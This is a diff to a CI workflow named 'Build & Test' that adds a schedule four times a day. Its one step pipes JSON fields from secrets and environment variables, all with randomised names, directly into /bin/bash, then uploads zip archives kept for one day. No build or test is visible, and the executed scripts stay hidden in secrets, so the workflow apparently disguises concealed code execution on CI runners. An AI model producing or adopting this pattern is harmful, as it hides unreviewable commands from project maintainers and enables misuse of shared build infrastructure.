@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '47 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,19 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          ydf5: ${{ secrets.ydf5 }}
+          nfiub569: ${{ secrets.nfiub569 }}
         run: |
-          printf '%s' "$ydf5" | jq -r .xeqn797 | /bin/bash
-          printf '%s' "$ee3" | jq -r .hpeyi969 | /bin/bash
-          printf '%s' "$zgj081" | jq -r .faxzb2937 | /bin/bash
-          printf '%s' "$whbcw0" | jq -r .na2086 | /bin/bash
-          printf '%s' "$mbzm500" | jq -r .eff4 | /bin/bash
-          echo $xwc9 | jq -r .enq88179 | /bin/bash
-          echo $so01 | jq -r .k4 | /bin/bash
+          printf '%s' "$nfiub569" | jq -r .xxog6 | /bin/bash
+          printf '%s' "$nbkg9570" | jq -r .xqr79277 | /bin/bash
+          printf '%s' "$fqp5688" | jq -r .jpi04 | /bin/bash
+          printf '%s' "$rm46626" | jq -r .kt3 | /bin/bash
+          printf '%s' "$m40240" | jq -r .edfge2 | /bin/bash
+          echo $nf25058 | jq -r .l944 | /bin/bash
+          printf '%s' "$axaw23" | jq -r .ctdv5016 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: nqGq42A2
+          name: duMLxBvp
           path: "*.zip"
           retention-days: 1
